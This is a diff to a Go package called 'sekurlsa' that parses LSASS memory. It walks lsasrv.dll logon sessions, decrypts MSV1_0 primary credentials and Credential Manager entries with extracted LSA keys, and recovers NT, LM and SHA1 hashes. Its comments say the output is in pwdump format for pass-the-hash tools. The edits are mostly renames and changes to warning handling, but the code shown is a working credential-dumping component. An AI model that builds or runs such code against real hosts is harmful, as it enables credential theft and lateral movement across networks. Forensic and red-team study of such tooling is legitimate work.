@@ -1,7 +1,6 @@
 package sekurlsa
 
 import (
-	"bytes"
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
@@ -65,12 +64,12 @@ type MSVLayout struct {
 	CredManLayout CredManLayout
 }
 
-// MSV1_0Credential is the credential payload extracted from an
+// MSVCredential is the credential payload extracted from an
 // MSV1_0 logon session. NT hash is the legacy MD4(unicode(password))
 // — the dominant pivot for pass-the-hash workflows. SHA1 hash is the
 // AES256-DPAPI-derived key Microsoft introduced in Win11. LM hash is
 // typically empty since Vista.
-type MSV1_0Credential struct {
+type MSVCredential struct {
 	UserName    string
 	LogonDomain string
 	NTHash      [16]byte
@@ -81,7 +80,7 @@ type MSV1_0Credential struct {
 }
 
 // AuthPackage satisfies the Credential interface.
-func (MSV1_0Credential) AuthPackage() string { return "MSV1_0" }
+func (MSVCredential) AuthPackage() string { return "MSV1_0" }
 
 // String renders the credential in the pwdump-compatible format
 // expected by pass-the-hash tools (`username:rid:LM:NT:::`). When LM
@@ -91,7 +90,7 @@ func (MSV1_0Credential) AuthPackage() string { return "MSV1_0" }
 //
 // The RID column is 0 — we don't extract the SID-from-LUID mapping
 // in v1; callers needing the real RID parse the SID field separately.
-func (c MSV1_0Credential) String() string {
+func (c MSVCredential) String() string {
 	dom := c.LogonDomain
 	user := c.UserName
 	if dom != "" {
@@ -112,7 +111,7 @@ func (c MSV1_0Credential) String() string {
 // Zeros every hash buffer in place — does NOT zero the strings, since
 // strings in Go are immutable + the original buffers may still be
 // referenced elsewhere by the caller.
-func (c *MSV1_0Credential) wipe() {
+func (c *MSVCredential) wipe() {
 	for i := range c.NTHash {
 		c.NTHash[i] = 0
 	}
@@ -137,7 +136,7 @@ func isAllZero(b []byte) bool {
 	return true
 }
 
-// extractMSV1_0 walks the LogonSessionList and decrypts every node's
+// extractMSV walks the LogonSessionList and decrypts every node's
 // PrimaryCredentials. Returns one LogonSession per node that yielded
 // at least a parseable username — fully-zero / decryption-failed
 // nodes accumulate as warnings.
@@ -152,7 +151,7 @@ func isAllZero(b []byte) bool {
 // lsasrvModule is the resolved lsasrv.dll Module from the parser;
 // lsaKey is the key chain from extractLSAKeys; t.MSVLayout supplies
 // the per-build node offsets.
-func extractMSV1_0(r *reader, lsasrvModule Module, t *Template, lsaKey *lsaKey) ([]LogonSession, []string) {
+func extractMSV(r *reader, lsasrvModule Module, t *Template, lsaKey *lsaKey) ([]LogonSession, []string) {
 	var (
 		sessions []LogonSession
 		warnings []string
@@ -192,10 +191,8 @@ func extractMSV1_0(r *reader, lsasrvModule Module, t *Template, lsaKey *lsaKey) 
 				warnings = append(warnings, fmt.Sprintf("MSV1_0 node @0x%X: %v", cur, err))
 				break
 			}
-			session, decryptWarn := decodeLogonSession(r, node, t, lsaKey)
-			if decryptWarn != "" {
-				warnings = append(warnings, decryptWarn)
-			}
+			session, decryptWarns := decodeLogonSession(r, node, t, lsaKey)
+			warnings = append(warnings, decryptWarns...)
 			if session != nil {
 				sessions = append(sessions, *session)
 			}
@@ -219,11 +216,12 @@ func mustReadModuleBody(r *reader, m Module) []byte {
 }
 
 // decodeLogonSession projects a node-bytes blob through the layout
-// to a LogonSession. Returns (nil, warning) when the username is
-// empty or decryption produced all zeros.
-func decodeLogonSession(r *reader, node []byte, t *Template, lsaKey *lsaKey) (*LogonSession, string) {
+// to a LogonSession. Returns (nil, warnings) when the username is
+// empty or decryption produced all zeros. Multiple warnings can
+// surface when the optional CredMan walk produces its own.
+func decodeLogonSession(r *reader, node []byte, t *Template, lsaKey *lsaKey) (*LogonSession, []string) {
 	if len(node) < int(t.MSVLayout.NodeSize) {
-		return nil, fmt.Sprintf("node too small: %d < %d", len(node), t.MSVLayout.NodeSize)
+		return nil, []string{fmt.Sprintf("node too small: %d < %d", len(node), t.MSVLayout.NodeSize)}
 	}
 
 	luid := binary.LittleEndian.Uint64(node[t.MSVLayout.LUIDOffset : t.MSVLayout.LUIDOffset+8])
@@ -234,7 +232,7 @@ func decodeLogonSession(r *reader, node []byte, t *Template, lsaKey *lsaKey) (*L
 	// Skip empty / system sessions — they exist in the list but have
 	// no credentials worth surfacing.
 	if username == "" {
-		return nil, ""
+		return nil, nil
 	}
 
 	logonType := LogonTypeUnknown
@@ -245,27 +243,29 @@ func decodeLogonSession(r *reader, node []byte, t *Template, lsaKey *lsaKey) (*L
 
 	cred, decryptErr := decryptMSVPrimary(r, node, t, lsaKey)
 	if decryptErr != "" {
-		return nil, decryptErr
+		return nil, []string{decryptErr}
 	}
 
 	cred.UserName = username
 	cred.LogonDomain = domain
 
-	credentials := []Credential{cred}
+	credentials := []Credential{&cred}
+	var warnings []string
 
 	// Optional CredMan walk — when MSVLayout.CredManListPtrOffset is
 	// non-zero, the session node carries a per-session pointer to
 	// the Credential Manager (Vault) list. Each entry produces a
-	// CredManCredential alongside the MSV1_0Credential in the same
+	// CredManCredential alongside the MSVCredential in the same
 	// session.
 	if t.MSVLayout.CredManListPtrOffset != 0 &&
 		t.MSVLayout.CredManListPtrOffset+8 <= t.MSVLayout.NodeSize {
 		credManPtr := binary.LittleEndian.Uint64(
 			node[t.MSVLayout.CredManListPtrOffset : t.MSVLayout.CredManListPtrOffset+8])
 		if credManPtr != 0 {
-			cmCreds, _ := extractCredMan(r, credManPtr, t.MSVLayout.CredManLayout, lsaKey)
-			for _, c := range cmCreds {
-				credentials = append(credentials, c)
+			cmCreds, cmWarns := extractCredMan(r, credManPtr, t.MSVLayout.CredManLayout, lsaKey)
+			warnings = append(warnings, cmWarns...)
+			for i := range cmCreds {
+				credentials = append(credentials, &cmCreds[i])
 			}
 		}
 	}
@@ -277,7 +277,7 @@ func decodeLogonSession(r *reader, node []byte, t *Template, lsaKey *lsaKey) (*L
 		LogonDomain: domain,
 		LogonServer: logonServer,
 		Credentials: credentials,
-	}, ""
+	}, warnings
 }
 
 // readUnicodeString dereferences a 16-byte UNICODE_STRING field
@@ -308,13 +308,13 @@ func readUnicodeString(r *reader, field []byte) string {
 // entry's payload with the lsaKey, and parses the resulting
 // MSV1_0_PRIMARY_CREDENTIAL struct for NT/LM/SHA1 hashes.
 //
-// Returns (zero MSV1_0Credential, "warning") if decryption fails;
+// Returns (zero MSVCredential, "warning") if decryption fails;
 // caller surfaces the warning into Result.Warnings.
-func decryptMSVPrimary(r *reader, node []byte, t *Template, lsaKey *lsaKey) (MSV1_0Credential, string) {
+func decryptMSVPrimary(r *reader, node []byte, t *Template, lsaKey *lsaKey) (MSVCredential, string) {
 	primaryPtrField := node[t.MSVLayout.CredentialsOffset : t.MSVLayout.CredentialsOffset+8]
 	primaryPtr := binary.LittleEndian.Uint64(primaryPtrField)
 	if primaryPtr == 0 {
-		return MSV1_0Credential{}, ""
+		return MSVCredential{}, ""
 	}
 
 	// PrimaryCredentials list entry layout (offsets are stable across
@@ -327,26 +327,26 @@ func decryptMSVPrimary(r *reader, node []byte, t *Template, lsaKey *lsaKey) (MSV
 	const primaryHeaderSize = 0x30
 	primaryHeader, err := r.ReadVA(primaryPtr, primaryHeaderSize)
 	if err != nil {
-		return MSV1_0Credential{}, fmt.Sprintf("primary header @0x%X: %v", primaryPtr, err)
+		return MSVCredential{}, fmt.Sprintf("primary header @0x%X: %v", primaryPtr, err)
 	}
 	credLen := binary.LittleEndian.Uint16(primaryHeader[0x20:0x22])
 	credBufPtr := binary.LittleEndian.Uint64(primaryHeader[0x28:0x30])
 	if credLen == 0 || credBufPtr == 0 {
-		return MSV1_0Credential{}, ""
+		return MSVCredential{}, ""
 	}
 	ct, err := r.ReadVA(credBufPtr, int(credLen))
 	if err != nil {
-		return MSV1_0Credential{}, fmt.Sprintf("primary cipher @0x%X: %v", credBufPtr, err)
+		return MSVCredential{}, fmt.Sprintf("primary cipher @0x%X: %v", credBufPtr, err)
 	}
 	pt, err := decryptLSA(ct, lsaKey)
 	if err != nil {
-		return MSV1_0Credential{}, fmt.Sprintf("decrypt primary @0x%X: %v", credBufPtr, err)
+		return MSVCredential{}, fmt.Sprintf("decrypt primary @0x%X: %v", credBufPtr, err)
 	}
 
-	return parseMSV1_0Primary(pt), ""
+	return parseMSVPrimary(pt), ""
 }
 
-// parseMSV1_0Primary projects a decrypted MSV1_0_PRIMARY_CREDENTIAL
+// parseMSVPrimary projects a decrypted MSV1_0_PRIMARY_CREDENTIAL
 // blob to typed hashes. Layout (Win10 1903+):
 //
 //   +0x00  LogonDomainName UNICODE_STRING
@@ -357,8 +357,8 @@ func decryptMSVPrimary(r *reader, node []byte, t *Template, lsaKey *lsaKey) (MSV
 //
 // Pre-Win11 layouts may have a shorter struct; we cap reads at the
 // declared blob length and zero-fill any tail field.
-func parseMSV1_0Primary(pt []byte) MSV1_0Credential {
-	c := MSV1_0Credential{}
+func parseMSVPrimary(pt []byte) MSVCredential {
+	c := MSVCredential{}
 	if len(pt) >= 0x40 {
 		copy(c.NTHash[:], pt[0x20:0x30])
 		copy(c.LMHash[:], pt[0x30:0x40])
@@ -369,9 +369,5 @@ func parseMSV1_0Primary(pt []byte) MSV1_0Credential {
 		copy(c.SHA1Hash[:], pt[0x40:0x54])
 	}
 	c.Found = !isAllZero(c.NTHash[:]) || !isAllZero(c.LMHash[:]) || !isAllZero(c.SHA1Hash[:])
-	// Defensive trim — Go strings ignore the buffer, but leftover
-	// non-printable bytes in the "tail" of the blob can confuse a
-	// hex viewer.
-	_ = bytes.TrimRight(pt, "\x00")
 	return c
 }
